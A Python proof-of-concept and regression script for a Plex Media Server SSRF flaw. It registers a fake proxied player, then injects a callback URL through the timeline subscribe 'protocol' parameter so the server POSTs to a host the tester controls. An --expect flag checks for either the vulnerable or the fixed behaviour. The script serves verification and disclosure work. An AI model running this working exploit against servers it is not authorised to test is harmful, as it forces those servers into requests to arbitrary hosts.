#!/usr/bin/env python3
import argparse
import http.server
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    event = threading.Event()
    observed_path = None
    observed_body = None

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        type(self).observed_path = self.path
        type(self).observed_body = self.rfile.read(length)
        type(self).event.set()
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, *_):
        pass


def fetch(url, headers=None, data=None, timeout=10):
    request = urllib.request.Request(url, headers=headers or {}, data=data)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def main():
    parser = argparse.ArgumentParser(
        description="Test Plex CompanionProxy callback authority injection"
    )
    parser.add_argument("--url", required=True, help="Plex server origin")
    parser.add_argument("--callback-host", required=True, help="Host reachable from PMS")
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--listen-port", type=int, default=3005)
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    args = parser.parse_args()

    origin = args.url.rstrip("/")
    parsed = urllib.parse.urlsplit(origin)
    if (parsed.scheme not in ("http", "https") or not parsed.netloc or
            parsed.path or parsed.query or parsed.fragment):
        parser.error("--url must be an HTTP(S) origin without a path")
    if not 1 <= args.listen_port <= 65535:
        parser.error("--listen-port must be between 1 and 65535")

    server = http.server.ThreadingHTTPServer(
        (args.listen_host, args.listen_port), CallbackHandler
    )
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    stamp = int(time.time() * 1000)
    player = f"proxy-ssrf-{stamp}"
    controller = f"proxy-controller-{stamp}"
    poll_params = {
        "deviceClass": "pc",
        "protocolVersion": "3",
        "protocolCapabilities": "timeline,playback,navigation",
        "timeout": "1",
        "X-Plex-Product": "Plex Security Test",
        "X-Plex-Version": "1.0",
        "X-Plex-Client-Identifier": player,
        "X-Plex-Platform": "Linux",
        "X-Plex-Platform-Version": "test",
        "X-Plex-Model": "container",
        "X-Plex-Device": "Linux",
        "X-Plex-Device-Name": "Proxied Test Player",
    }
    poll_url = f"{origin}/player/proxy/poll?{urllib.parse.urlencode(poll_params)}"
    poll = threading.Thread(target=lambda: fetch(poll_url, timeout=20), daemon=True)
    poll.start()

    for _ in range(80):
        _, clients = fetch(f"{origin}/clients")
        if player.encode() in clients:
            break
        time.sleep(0.25)
    else:
        raise RuntimeError("proxied player did not register")

    callback_prefix = f"/injected-{stamp}?original="
    injected_protocol = (
        f"http://{args.callback_host}:{args.listen_port}{callback_prefix}"
    )
    subscribe_query = urllib.parse.urlencode(
        {"protocol": injected_protocol, "port": args.listen_port, "commandID": 2}
    )
    headers = {
        "X-Plex-Client-Identifier": controller,
        "X-Plex-Target-Client-Identifier": player,
        "X-Plex-Device-Name": "Plex Security Controller",
    }
    subscribe_status, _ = fetch(
        f"{origin}/player/timeline/subscribe?{subscribe_query}", headers=headers
    )
    timeline = (
        b'<MediaContainer><Timeline type="video" state="stopped" '
        b'time="0" duration="1"/></MediaContainer>'
    )
    timeline_status, _ = fetch(
        f"{origin}/player/proxy/timeline?commandID=2",
        headers={
            "X-Plex-Client-Identifier": player,
            "X-Plex-Device-Name": "Proxied Test Player",
            "Content-Type": "application/xml",
        },
        data=timeline,
    )
    callback = CallbackHandler.event.wait(3)
    server.shutdown()

    print(f"Subscribe status: {subscribe_status}")
    print(f"Timeline status: {timeline_status}")
    print(f"Callback observed: {callback}")
    if callback:
        print(f"Callback path: {CallbackHandler.observed_path}")

    if args.expect == "vulnerable":
        if subscribe_status != 200 or timeline_status != 200 or not callback:
            raise RuntimeError("SSRF callback was not observed")
        if not CallbackHandler.observed_path.startswith(callback_prefix):
            raise RuntimeError("callback did not use the injected path")
    elif subscribe_status != 400 or callback:
        raise RuntimeError("fixed behavior was not observed")
    if args.expect == "vulnerable":
        print("PASS: timeline POST reached the per-run injected callback path")
    else:
        print("PASS: injected callback protocol rejected with HTTP 400")


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
